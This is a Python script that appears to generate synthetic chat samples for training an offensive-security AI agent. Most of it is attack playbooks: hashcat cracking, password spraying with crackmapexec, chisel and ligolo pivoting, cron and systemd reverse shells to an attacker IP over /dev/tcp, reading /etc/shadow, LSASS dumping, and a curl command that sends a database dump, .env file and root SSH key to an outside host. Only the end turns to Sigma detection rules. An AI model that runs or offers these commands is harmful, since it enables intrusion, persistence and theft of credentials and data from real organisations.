        ("$6$rounds=5000$salt$hash...", 1800, "sha512crypt", "moderate — ~500 KH/s"),
        ("aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b", 1000, "NTLM", "fast — ~100 GH/s"),
        ("$krb5tgs$23$*svc_sql$CORP.LOCAL$...", 13100, "Kerberos TGS-REP", "moderate — ~1 GH/s"),
        ("$krb5asrep$23$svc_legacy@CORP.LOCAL:...", 18200, "Kerberos AS-REP", "moderate — ~1 GH/s"),
        ("5f4dcc3b5aa765d61d8327deb882cf99", 0, "MD5", "very fast — ~60 GH/s"),
        ("e10adc3949ba59abbe56e057f20f883e", 0, "MD5", "very fast — ~60 GH/s"),
        ("$1$salt$hash...", 500, "md5crypt", "moderate — ~25 MH/s"),
        ("b89eaac7e61417341b710b727768294d0e6a277b", 100, "SHA1", "fast — ~20 GH/s"),
    ]

    for _ in range(700):
        hash_sample = random.choice(hash_types)
        hash_value, mode, hash_name, speed = hash_sample
        target = rand_ip()
        num_hashes = random.randint(1, 50)

        scenario = random.choice(["crack", "spray", "wordlist_selection"])

        if scenario == "crack":
            user = random.choice([
                f"Crack these {hash_name} hashes ({num_hashes} total). First few:\n{hash_value}",
                f"I have {num_hashes} {hash_name} hashes from the target. Best approach to crack them?",
                f"hashcat strategy for {num_hashes} {hash_name} hashes?",
            ])

            cracked = random.randint(int(num_hashes * 0.3), int(num_hashes * 0.8))
            assistant = f"""**Hash cracking strategy for {hash_name} (hashcat mode {mode}):**

Speed: {speed}

**Phase 1: Quick wins (wordlist + rules)**
<exec timeout="3600">hashcat -m {mode} /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule -O</exec>

**Phase 2: Targeted wordlist (company-specific)**
<exec timeout="1800">hashcat -m {mode} /tmp/hashes.txt /tmp/custom_wordlist.txt --rules-file /usr/share/hashcat/rules/d3ad0ne.rule</exec>

**Phase 3: Mask attack (common patterns)**
<exec timeout="3600">hashcat -m {mode} /tmp/hashes.txt -a 3 '?u?l?l?l?l?l?d?d?d?s' --increment --increment-min 8</exec>

**Results after full attack:**
```
Recovered........: {cracked}/{num_hashes} ({int(cracked/num_hashes*100)}%)
Time.Spent.......: {random.randint(5, 120)} minutes

Cracked passwords:
{chr(10).join([f"  {random.choice(USERNAMES)}:{random.choice(PASSWORDS)}" for _ in range(min(5, cracked))])}
```

<finding severity="high" target="{target}">Cracked {cracked}/{num_hashes} {hash_name} hashes. Weak password policy — multiple users with common passwords.</finding>

**Recommendations:**
1. Test cracked credentials for reuse across other services
2. {"Spray the cracked passwords against SMB/RDP/WinRM" if mode in [1000, 13100, 18200] else "Check for credential reuse on web applications"}
3. Feed cracked passwords back as rules for remaining hashes"""

        elif scenario == "spray":
            user = random.choice([
                f"Spray common passwords against the domain {target}. We have a user list of 500 accounts",
                f"Password spray against SMB on {target} with the domain user list",
                f"I need to spray {target} — what passwords and what timing to avoid lockout?",
            ])

            assistant = f"""**Password Spray Strategy:**

**Lockout policy considerations:**
- Typical AD: 5 attempts / 30 min lockout window
- Spray 1 password per 35 minutes to stay under threshold
- {"Use known lockout policy from LDAP enum" if random.random() > 0.5 else "Assume conservative 3 attempts / 30 min if policy unknown"}

**Top spray candidates** (seasonal/company pattern):
```
Summer2024!
{rand_domain().split('.')[0].title()}2024!
Welcome1!
Password123!
Changeme1!
{datetime.now().strftime('%B')}2024!
```

**Execution:**
<exec timeout="600">crackmapexec smb {target} -u /tmp/users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success 2>/dev/null</exec>

Wait 35 minutes between sprays...

<exec timeout="600">crackmapexec smb {target} -u /tmp/users.txt -p '{rand_domain().split(".")[0].title()}2024!' --no-bruteforce --continue-on-success 2>/dev/null</exec>

```
SMB   {target}  445  DC01  [+] CORP.LOCAL\\jsmith:Summer2024!
SMB   {target}  445  DC01  [+] CORP.LOCAL\\helpdesk:Summer2024!
SMB   {target}  445  DC01  [+] CORP.LOCAL\\svc_backup:{rand_domain().split('.')[0].title()}2024!
```

<finding severity="high" target="{target}">Password spray successful — 3 accounts compromised with common passwords. Weak password policy.</finding>

**Valid credentials found:**
| Username | Password | Notes |
|----------|----------|-------|
| jsmith | Summer2024! | Standard user |
| helpdesk | Summer2024! | May have elevated access |
| svc_backup | {rand_domain().split('.')[0].title()}2024! | Service account — check backup operator privs |

**Next steps:**
1. Check group memberships for compromised accounts
2. Enumerate accessible shares with each credential
3. Run BloodHound from jsmith's context for attack path mapping"""

        else:  # wordlist_selection
            user = f"I'm attacking {rand_domain()} — what wordlists and rules should I use for password cracking?"
            company = rand_domain().split('.')[0].replace('-', ' ').title()

            assistant = f"""**Wordlist Strategy for {company}:**

**1. Base wordlists (largest → smallest):**
```
/usr/share/wordlists/rockyou.txt              (14M passwords)
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Leaked-Databases/
```

**2. Custom company wordlist generation:**
<exec timeout="30">cat << 'EOF' > /tmp/{rand_domain().split('.')[0]}_custom.txt
{company}2024!
{company}2023!
{company.lower()}2024
{company}@2024
{company}#2024
Welcome{company}!
{company}Summer2024
{company}Winter2024
{company}123!
{company}Admin!
EOF</exec>

**3. Rule files (in order of effectiveness):**
```
/usr/share/hashcat/rules/best64.rule          (77 rules — fast)
/usr/share/hashcat/rules/d3ad0ne.rule         (34K rules — thorough)
/usr/share/hashcat/rules/OneRuleToRuleThemAll (51K rules — comprehensive)
/usr/share/hashcat/rules/dive.rule            (99K rules — exhaustive)
```

**4. CeWL for target-specific words:**
<exec timeout="120">cewl https://{rand_domain()} -d 3 -m 5 -w /tmp/cewl_{rand_domain().split('.')[0]}.txt</exec>

**5. Recommended attack order:**
1. `rockyou.txt` + `best64.rule` (quick wins, ~5 min)
2. Custom company wordlist + `d3ad0ne.rule` (targeted, ~15 min)
3. CeWL output + `OneRuleToRuleThemAll` (site-specific, ~30 min)
4. Mask attack for remaining: `?u?l?l?l?l?d?d?d?s` (brute-force patterns)
5. Combinator: `rockyou.txt` + `company_custom.txt` (hybrid)"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_exploit_pivot_chains():
    """Pivot chains: initial foothold to lateral movement."""
    samples = []

    for _ in range(700):
        initial_target = rand_ip()
        internal_targets = [rand_ip() for _ in range(random.randint(2, 5))]
        domain = "corp.local"
        attacker = "10.10.14.5"

        user = random.choice([
            f"I have a shell on {initial_target} as www-data. I can see internal network {internal_targets[0].rsplit('.', 1)[0]}.0/24. Plan the pivot.",
            f"Got initial foothold on {initial_target}. Internal hosts visible: {', '.join(internal_targets[:3])}. How do I pivot?",
            f"Web shell on {initial_target}. Need to reach the DC at {internal_targets[0]}. What's the pivot strategy?",
        ])

        assistant = f"""**Pivot Strategy: {initial_target} → Internal Network**

**Current position:** Low-privilege shell on {initial_target} (www-data/webshell)
**Target:** Internal network {internal_targets[0].rsplit('.', 1)[0]}.0/24, specifically {internal_targets[0]}

**Phase 1: Establish tunnel from {initial_target}**

Option A — **Chisel** (recommended, single binary, encrypted):
<exec timeout="30">curl http://{attacker}:8000/chisel -o /tmp/chisel && chmod +x /tmp/chisel</exec>

On attacker (server):
<exec timeout="10">chisel server --reverse --port 8001</exec>

On target (client):
<exec timeout="10">/tmp/chisel client {attacker}:8001 R:socks</exec>

Option B — **SSH tunnel** (if SSH available):
<exec timeout="10">ssh -D 1080 -N -f user@{initial_target}</exec>

Option C — **Ligolo-ng** (more stable for long operations):
<exec timeout="10">ligolo-agent -connect {attacker}:11601 -ignore-cert</exec>

**Phase 2: Scan internal network through tunnel**
<exec timeout="120">proxychains4 nmap -sT -Pn -p 22,80,135,139,389,443,445,3389,5985 {internal_targets[0].rsplit('.', 1)[0]}.0/24 --open</exec>

**Phase 3: Lateral movement to {internal_targets[0]}**
Once tunnel is established, attack internal targets as if directly connected:
<exec timeout="60">proxychains4 crackmapexec smb {internal_targets[0]} -u 'admin' -p '{random.choice(PASSWORDS)}'</exec>

**OPSEC considerations:**
- {"Chisel uses HTTP/HTTPS — blends with normal traffic" if random.random() > 0.5 else "Use DNS tunneling if HTTP egress is filtered"}
- Scan slowly through proxy to avoid detection
- {"Consider time-of-day — attack during business hours when traffic is normal" if random.random() > 0.5 else "Rate limit scans to avoid triggering IDS on the pivot host"}

<finding severity="high" target="{initial_target}">Pivot established from {initial_target} to internal network. SOCKS proxy operational on port 1080.</finding>"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CATEGORY 3: POST-EXPLOITATION (3,000+ samples)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_postexploit_persistence():
    """Persistence mechanisms."""
    samples = []

    linux_persistence = [
        {
            "name": "Cron backdoor",
            "cmd": '(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/{attacker}/4444 0>&1\'") | crontab -',
            "detect": "crontab -l, /var/spool/cron/*, /etc/cron.d/",
            "stealth": "Low — cron jobs are routinely audited",
        },
        {
            "name": "SSH authorized_keys",
            "cmd": "echo 'ssh-rsa AAAA...attacker_key... backdoor@attacker' >> /root/.ssh/authorized_keys",
            "detect": "/root/.ssh/authorized_keys, auth.log SSH logins",
            "stealth": "Medium — blends with legitimate keys",
        },
        {
            "name": "systemd service",
            "cmd": "cat > /etc/systemd/system/update-helper.service << 'EOF'\n[Unit]\nDescription=System Update Helper\nAfter=network.target\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{attacker}/4444 0>&1'\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable update-helper.service",
            "detect": "systemctl list-units, /etc/systemd/system/*.service",
            "stealth": "Medium — disguised as system service",
        },
        {
            "name": "LD_PRELOAD backdoor",
            "cmd": "echo '/usr/local/lib/libsystem.so' > /etc/ld.so.preload",
            "detect": "/etc/ld.so.preload, ldd output, strace",
            "stealth": "High — difficult to detect without specific checks",
        },
        {
            "name": "PAM backdoor",
            "cmd": "# Modify /lib/x86_64-linux-gnu/security/pam_unix.so to accept magic password",
            "detect": "File integrity monitoring on PAM modules, hash comparison",
            "stealth": "High — looks like legitimate auth, survives password changes",
        },
    ]

    windows_persistence = [
        {
            "name": "Registry Run key",
            "cmd": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Users\\Public\\svc.exe" /f',
            "detect": "Autoruns, Registry monitoring, Sysmon Event ID 13",
            "stealth": "Low — well-known persistence location",
        },
        {
            "name": "Scheduled Task",
            "cmd": 'schtasks /create /tn "\\Microsoft\\Windows\\UpdateCheck" /tr "C:\\Windows\\Temp\\beacon.exe" /sc onlogon /ru SYSTEM',
            "detect": "schtasks /query, Sysmon Event ID 1, Task Scheduler logs",
            "stealth": "Medium — disguised in Microsoft folder",
        },
        {
            "name": "WMI Event Subscription",
            "cmd": "# Create WMI permanent event subscription via PowerShell Set-WmiInstance -Class __EventFilter",
            "detect": "Get-WmiObject __EventFilter, Sysmon WMI events",
            "stealth": "High — fileless, survives reboots",
        },
        {
            "name": "DLL Search Order Hijacking",
            "cmd": "# Place malicious DLL in application directory that loads before system32 copy",
            "detect": "Process Monitor DLL load events, file integrity monitoring",
            "stealth": "High — executes within legitimate process context",
        },
        {
            "name": "Golden Ticket",
            "cmd": "impacket-ticketer -nthash {krbtgt_hash} -domain-sid S-1-5-21-... -domain corp.local administrator",
            "detect": "Event ID 4769 with RC4 encryption, TGT lifetime anomalies",
            "stealth": "Very high — appears as legitimate Kerberos auth",
        },
    ]

    all_persistence = [(p, "linux") for p in linux_persistence] + [(p, "windows") for p in windows_persistence]

    for _ in range(800):
        persist, os_type = random.choice(all_persistence)
        target = rand_ip()
        attacker = "10.10.14.5"

        user = random.choice([
            f"Establish persistence on {target} ({os_type.title()}). I have {'root' if os_type == 'linux' else 'SYSTEM'} access.",
            f"I need to maintain access to {target}. What persistence options do I have on {os_type.title()}?",
            f"Set up a backdoor on {target} that survives reboot. OS: {os_type.title()}.",
        ])

        cmd_formatted = persist["cmd"].format(attacker=attacker, krbtgt_hash=rand_hash("md5"))

        assistant = f"""**Persistence: {persist["name"]}** ({os_type.title()})

**Installation:**
<exec timeout="30">{cmd_formatted}</exec>

**Characteristics:**
| Property | Value |
|----------|-------|
| Mechanism | {persist["name"]} |
| Survives reboot | Yes |
| Stealth level | {persist["stealth"]} |
| Detection vectors | {persist["detect"]} |

**Verification:**
{"<exec timeout=\"10\">crontab -l</exec>" if "cron" in persist["name"].lower() else "<exec timeout=\"10\">systemctl status update-helper</exec>" if "systemd" in persist["name"].lower() else "<exec timeout=\"10\">reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"</exec>" if "Registry" in persist["name"] else "<exec timeout=\"10\">schtasks /query /tn \"\\Microsoft\\Windows\\UpdateCheck\"</exec>" if "Scheduled" in persist["name"] else "Verify persistence is active"}

**OPSEC notes:**
- {persist["stealth"]}
- {"Rename the binary to something legitimate (syslogd, crond, etc.)" if os_type == "linux" else "Sign the payload with a stolen/self-signed cert to avoid SmartScreen"}
- {"Set file timestamps to match surrounding files: touch -r /bin/ls /tmp/backdoor" if os_type == "linux" else "Timestomp the file to match surrounding DLLs"}
- Consider {"multiple persistence mechanisms for redundancy" if random.random() > 0.5 else "a single mechanism to minimize detection surface"}

<finding severity="high" target="{target}">Persistence established via {persist["name"]}. Access will survive reboot.</finding>"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_postexploit_credential_harvest():
    """Credential harvesting from memory, files, and services."""
    samples = []

    harvest_techniques = [
        {
            "name": "Linux credential files",
            "user": "Harvest credentials from {target}. I have root on a Linux web server.",
            "assistant": """**Credential Harvesting — Linux Web Server**

**1. System credentials:**
<exec timeout="10">cat /etc/shadow | grep -v '!' | grep -v '*'</exec>
```
root:$6$xyz$hash...:19500:0:99999:7:::
www-data:$6$abc$hash...:19500:0:99999:7:::
deploy:$6$def$hash...:19500:0:99999:7:::
```

**2. Application configuration files:**
<exec timeout="10">find / -name "*.conf" -o -name "*.env" -o -name "*.yml" -o -name "*.properties" 2>/dev/null | xargs grep -l -i "password\\|secret\\|key\\|token" 2>/dev/null</exec>
```
/var/www/app/.env
/etc/mysql/debian.cnf
/opt/app/config/database.yml
/var/www/app/config/secrets.yml
```

**3. Environment variables:**
<exec timeout="10">cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i "pass\|secret\|key\|token\|api"</exec>

**4. SSH keys:**
<exec timeout="10">find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null</exec>
```
/root/.ssh/id_rsa
/home/deploy/.ssh/id_rsa
/opt/app/keys/deploy.pem
```

**5. Command history:**
<exec timeout="10">cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -i "pass\\|secret\\|mysql\\|psql\\|ssh\\|curl.*-u"</exec>

**6. Database credentials:**
<exec timeout="10">cat /var/www/app/.env</exec>
```
DB_HOST=localhost
DB_USER=app_user
DB_PASS=Pr0duct10n_P@ss!
DB_NAME=app_production
REDIS_URL=redis://:r3d1s_s3cret@localhost:6379
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

<finding severity="critical" target="{target}">Multiple credentials harvested: database passwords, AWS keys, SSH private keys, and application secrets.</finding>""",
        },
        {
            "name": "Windows credential dump",
            "user": "Dump all credentials from {target}. I have SYSTEM on a Windows domain-joined workstation.",
            "assistant": """**Credential Harvesting — Windows Domain Workstation**

**1. SAM database (local accounts):**
<exec timeout="30">reg save HKLM\\SAM C:\\Temp\\sam && reg save HKLM\\SYSTEM C:\\Temp\\system && impacket-secretsdump -sam C:\\Temp\\sam -system C:\\Temp\\system LOCAL</exec>
```
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**2. LSASS memory (cached domain credentials):**
<exec timeout="30">procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp</exec>
<exec timeout="30">pypykatz lsa minidump C:\\Temp\\lsass.dmp</exec>
```
Domain: CORP
Username: jsmith
NT: e19ccf75ee54e06b06a5907af13cef42
Username: admin
NT: 64f12cddaa88057e06a81b54e73b949b
```

**3. Cached credentials (DCC2):**
<exec timeout="10">reg save HKLM\\SECURITY C:\\Temp\\security && impacket-secretsdump -security C:\\Temp\\security -system C:\\Temp\\system LOCAL</exec>

**4. Browser saved passwords:**
<exec timeout="30">SharpChromium.exe logins</exec>

**5. WiFi passwords:**
<exec timeout="10">netsh wlan show profiles | findstr "Profile" && netsh wlan show profile name="CorpWifi" key=clear</exec>

**6. Vault credentials:**
<exec timeout="10">cmdkey /list</exec>

<finding severity="critical" target="{target}">Domain credentials harvested from LSASS: jsmith and admin NTLM hashes. Multiple local accounts and cached credentials extracted.</finding>""",
        },
    ]

    for _ in range(700):
        technique = random.choice(harvest_techniques)
        target = rand_ip()
        user_msg = technique["user"].format(target=target)
        assistant = technique["assistant"].format(target=target)
        samples.append(make_sample(SYSTEM_OFFENSIVE, user_msg, assistant))

    return samples


def gen_postexploit_pivoting():
    """Pivoting through networks."""
    samples = []

    pivot_tools = [
        {
            "tool": "chisel",
            "setup_server": "chisel server --reverse --port 8001",
            "setup_client": "chisel client {attacker}:8001 R:socks",
            "description": "Encrypted SOCKS proxy via single binary",
        },
        {
            "tool": "ligolo-ng",
            "setup_server": "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
            "setup_client": "ligolo-agent -connect {attacker}:11601 -ignore-cert",
            "description": "Kernel-level tunnel with interface routing",
        },
        {
            "tool": "SSH dynamic port forward",
            "setup_server": "# No server setup needed",
            "setup_client": "ssh -D 1080 -N -f user@{pivot_host}",
            "description": "SOCKS proxy via SSH — most reliable if SSH access exists",
        },
        {
            "tool": "SSH local port forward",
            "setup_server": "# No server setup needed",
            "setup_client": "ssh -L 445:{internal_target}:445 -N -f user@{pivot_host}",
            "description": "Direct port forward for specific service access",
        },
    ]

    for _ in range(600):
        tool = random.choice(pivot_tools)
        attacker = "10.10.14.5"
        pivot_host = rand_ip()
        internal_target = rand_ip()
        internal_subnet = internal_target.rsplit('.', 1)[0] + ".0/24"

        user = random.choice([
            f"Set up a pivot through {pivot_host} to reach {internal_subnet}. Use {tool['tool']}.",
            f"I compromised {pivot_host} and can see {internal_subnet}. How do I tunnel traffic through it?",
            f"Need to access {internal_target} which is only reachable from {pivot_host}. Set up pivot.",
        ])

        assistant = f"""**Pivoting via {tool['tool']}**
{tool['description']}

**Architecture:**
```
Attacker ({attacker}) → {pivot_host} (compromised) → {internal_subnet} (target network)
```

**Setup:**

On attacker:
<exec timeout="10">{tool['setup_server'].format(attacker=attacker)}</exec>

On pivot host ({pivot_host}):
<exec timeout="10">{tool['setup_client'].format(attacker=attacker, pivot_host=pivot_host, internal_target=internal_target)}</exec>

**Verification:**
<exec timeout="30">proxychains4 nmap -sT -Pn -p 445,3389,5985 {internal_target} --open</exec>

```
Nmap scan report for {internal_target}
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wts-env
5985/tcp open  wsman
```

**Tunnel confirmed — internal host reachable through pivot.**

**Usage through proxy:**
```bash
# All tools via proxychains
proxychains4 crackmapexec smb {internal_target}
proxychains4 evil-winrm -i {internal_target} -u admin -p 'Password1'
proxychains4 impacket-psexec corp.local/admin@{internal_target}

# Or configure tools directly (SOCKS5 on 1080)
export ALL_PROXY=socks5://127.0.0.1:1080
```

**OPSEC:**
- {tool['tool']} traffic {"encrypted — looks like HTTPS" if tool['tool'] in ['chisel', 'ligolo-ng'] else "is SSH — normal traffic pattern"}
- Scan slowly through the tunnel to avoid detection on pivot host
- Monitor tunnel stability — reconnect if dropped

<finding severity="info" target="{pivot_host}">Pivot established via {tool['tool']}. Internal network {internal_subnet} now accessible.</finding>"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


def gen_postexploit_data_discovery():
    """Data discovery and exfiltration."""
    samples = []

    for _ in range(600):
        target = rand_ip()
        os_type = random.choice(["linux", "windows"])

        user = random.choice([
            f"I have {'root' if os_type == 'linux' else 'SYSTEM'} on {target}. Find sensitive data for exfiltration.",
            f"Discover high-value data on {target} ({os_type.title()}) — databases, credentials, PII, intellectual property.",
            f"What sensitive files should I look for on this compromised {os_type.title()} server?",
        ])

        if os_type == "linux":
            assistant = f"""**Data Discovery — Linux Server ({target})**

**1. Database dumps / backups:**
<exec timeout="30">find / -name "*.sql" -o -name "*.dump" -o -name "*.bak" -o -name "*.tar.gz" 2>/dev/null | head -20</exec>
```
/var/backups/db_production_20240115.sql.gz (245MB)
/opt/backups/users_table.dump (12MB)
/tmp/migration_backup.sql (890MB)
```

**2. Configuration with secrets:**
<exec timeout="10">find / \\( -name ".env" -o -name "*.conf" -o -name "secrets*" -o -name "*credentials*" \\) -type f 2>/dev/null</exec>

**3. SSH keys and certificates:**
<exec timeout="10">find / -name "id_rsa*" -o -name "*.pem" -o -name "*.key" -o -name "*.p12" 2>/dev/null</exec>

**4. Source code with embedded secrets:**
<exec timeout="30">grep -r "API_KEY\|SECRET\|PASSWORD\|aws_access" /var/www /opt/app /srv 2>/dev/null | head -20</exec>

**5. User data / PII:**
<exec timeout="10">find / -name "*.csv" -o -name "*.xlsx" -o -name "*customer*" -o -name "*user*export*" 2>/dev/null | head -10</exec>

**High-value findings:**
| File | Size | Sensitivity |
|------|------|------------|
| /var/backups/db_production.sql.gz | 245MB | Critical — full production DB |
| /root/.ssh/id_rsa | 2KB | High — root SSH key |
| /var/www/app/.env | 1KB | High — API keys, DB creds |
| /opt/backups/users_table.dump | 12MB | Critical — user PII |

**Exfiltration options:**
1. **Small files (<10MB):** base64 encode → copy-paste or DNS exfil
2. **Medium (10-100MB):** SCP/SFTP to attacker's server
3. **Large (>100MB):** Split + compress, transfer overnight via encrypted channel
4. **Stealth:** tar + encrypt + blend with outbound HTTPS traffic

<exec timeout="60">tar czf /tmp/.cache.tar.gz /var/backups/db_production_20240115.sql.gz /var/www/app/.env /root/.ssh/id_rsa && curl -X POST -F "file=@/tmp/.cache.tar.gz" http://{rand_ip()}/upload</exec>"""
        else:
            assistant = f"""**Data Discovery — Windows Server ({target})**

**1. Shared drives and documents:**
<exec timeout="30">dir /s /b C:\\Users\\*.docx C:\\Users\\*.xlsx C:\\Users\\*.pdf C:\\Users\\*.kdbx 2>nul</exec>
<exec timeout="10">net share</exec>

**2. Password databases:**
<exec timeout="10">dir /s /b C:\\ *.kdbx *.kdb *.1pif 2>nul</exec>
```
C:\\Users\\admin\\Documents\\passwords.kdbx
C:\\IT\\shared\\team_vault.kdbx
```

**3. Email archives:**
<exec timeout="10">dir /s /b C:\\Users\\*.pst C:\\Users\\*.ost 2>nul</exec>

**4. Source code repositories:**
<exec timeout="10">dir /s /b C:\\ .git 2>nul</exec>

**5. Sensitive documents (keywords):**
<exec timeout="30">findstr /s /i /m "confidential secret password salary ssn" C:\\Users\\*.txt C:\\Users\\*.docx 2>nul</exec>

**High-value findings:**
| File | Sensitivity |
|------|------------|
| passwords.kdbx | Critical — password manager DB |
| *.pst files | High — email archives (may contain secrets) |
| C:\\IT\\shared\\ | High — IT documentation and configs |
| Browser profiles | High — saved passwords and sessions |

**Exfiltration:**
<exec timeout="60">7z a -p"ExfilP@ss" C:\\Temp\\data.7z C:\\Users\\admin\\Documents\\passwords.kdbx && certutil -encode C:\\Temp\\data.7z C:\\Temp\\data.b64</exec>"""

        samples.append(make_sample(SYSTEM_OFFENSIVE, user, assistant))

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CATEGORY 4: DETECTION ENGINEERING (3,000+ samples)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_detect_sigma_rules():
    """Sigma rule writing from attack descriptions."""
    samples = []

    attacks = [
        {
            "attack": "Kerberoasting",
            "description": "Detect Kerberoasting by monitoring for TGS ticket requests with RC4 encryption from non-service accounts",
            "rule": """title: Potential Kerberoasting Activity
id: {rule_id}
status: experimental
description: Detects potential Kerberoasting attacks by monitoring for TGS requests with RC4 encryption
references:
    - https://attack.mitre.org/techniques/T1558/003/
author: Security Team
date: 2024/01/15
tags:
    - attack.credential_access
    - attack.t1558.003
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'  # RC4
        ServiceName|endswith:
            - '$'
    filter_accounts:
        TargetUserName|endswith: '$'
    condition: selection and not filter_accounts
falsepositives:
    - Legacy applications requiring RC4
    - Service accounts requesting tickets for other services
level: medium""",
        },
        {
            "attack": "DCSync",
            "description": "Detect DCSync attacks by monitoring for replication requests from non-DC sources",
            "rule": """title: DCSync Attack Detected
id: {rule_id}
status: experimental
description: Detects DCSync (directory replication) from non-domain controller sources
references:
    - https://attack.mitre.org/techniques/T1003/006/
author: Security Team
date: 2024/01/15
tags:
    - attack.credential_access
    - attack.t1003.006
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        AccessMask: '0x100'
        Properties|contains:
            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes
            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes-All
    filter_dc:
        SubjectUserName|endswith: '$'
        SubjectUserName|contains:
            - 'DC01'
            - 'DC02'
    condition: selection and not filter_dc
falsepositives:
    - Legitimate replication tools
    - Azure AD Connect
level: critical""",
        },
        {
            "attack": "Pass-the-Hash",
            "description": "Detect Pass-the-Hash by monitoring for NTLM authentication with specific logon types",
            "rule": """title: Pass-the-Hash Activity
id: {rule_id}
status: experimental
description: Detects Pass-the-Hash attacks via NTLM logon with Network logon type
references:
    - https://attack.mitre.org/techniques/T1550/002/
author: Security Team
date: 2024/02/01
tags:
    - attack.lateral_movement
    - attack.t1550.002
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
        LogonProcessName: 'NtLmSsp'
    filter_normal:
        SourceNetworkAddress|startswith:
            - '127.'
            - '::1'
        TargetUserName|endswith: '$'
    condition: selection and not filter_normal
falsepositives:
    - Legacy applications using NTLM
    - Cross-forest authentication
level: medium""",
        },
        {
            "attack": "Suspicious PowerShell execution",
            "description": "Detect encoded/obfuscated PowerShell commands commonly used by attackers",
            "rule": """title: Suspicious PowerShell Encoded Command
id: {rule_id}
status: experimental
description: Detects PowerShell execution with encoded commands and suspicious flags
author: Security Team
date: 2024/02/15
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    category: process_creation
detection:
    selection_encoded:
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - '-e '
        Image|endswith: '\\powershell.exe'
    selection_bypass:
        CommandLine|contains:
            - '-ExecutionPolicy Bypass'
            - '-ep bypass'
            - '-nop'
            - 'Set-MpPreference'
            - 'Add-MpPreference'
    selection_download:
        CommandLine|contains:
            - 'IEX'
            - 'Invoke-Expression'
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Start-BitsTransfer'
    condition: selection_encoded or (selection_bypass and selection_download)
falsepositives:
    - Legitimate admin scripts
    - Configuration management tools
level: high""",
        },
        {
            "attack": "LSASS memory access",
            "description": "Detect tools accessing LSASS memory for credential dumping",
            "rule": """title: LSASS Memory Access for Credential Dumping
id: {rule_id}
status: experimental
description: Detects processes accessing LSASS memory — indicates credential dumping
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Security Team
date: 2024/03/01
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    product: windows
    category: process_access
detection:
    selection:
        TargetImage|endswith: '\\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x1438'
            - '0x143a'
    filter_legitimate:
        SourceImage|endswith:
            - '\\wmiprvse.exe'
            - '\\MsMpEng.exe'
            - '\\csrss.exe'
            - '\\svchost.exe'
    condition: selection and not filter_legitimate
falsepositives:
    - Security products
    - Debugging tools (authorized use)
level: critical""",
        },
    ]

    for _ in range(800):
        attack = random.choice(attacks)
        rule_id = f"{rand_hash('md5')[:8]}-{rand_hash('md5')[:4]}-{rand_hash('md5')[:4]}-{rand_hash('md5')[:4]}-{rand_hash('md5')[:12]}"

        user = random.choice([
            f"Write a Sigma rule to detect {attack['attack']}",
            f"I need a detection rule for {attack['attack']}. Write it in Sigma format.",
            f"Create a Sigma detection for: {attack['description']}",
            f"How would I detect {attack['attack']} with a Sigma rule?",
        ])

        assistant = f"""**Sigma Rule: Detect {attack['attack']}**

{attack['description']}

```yaml
{attack['rule'].format(rule_id=rule_id)}
```

**Detection logic explained:**
- **What it detects:** {attack['description']}
- **Log source:** Windows Security Event Log
- **False positive handling:** Filtered legitimate system processes and service accounts
- **MITRE ATT&CK:** {attack['attack']} maps to the detection selection criteria

**Deployment notes:**
1. Test in detection-only mode first (no blocking)
2. Tune false positives for your environment before alerting
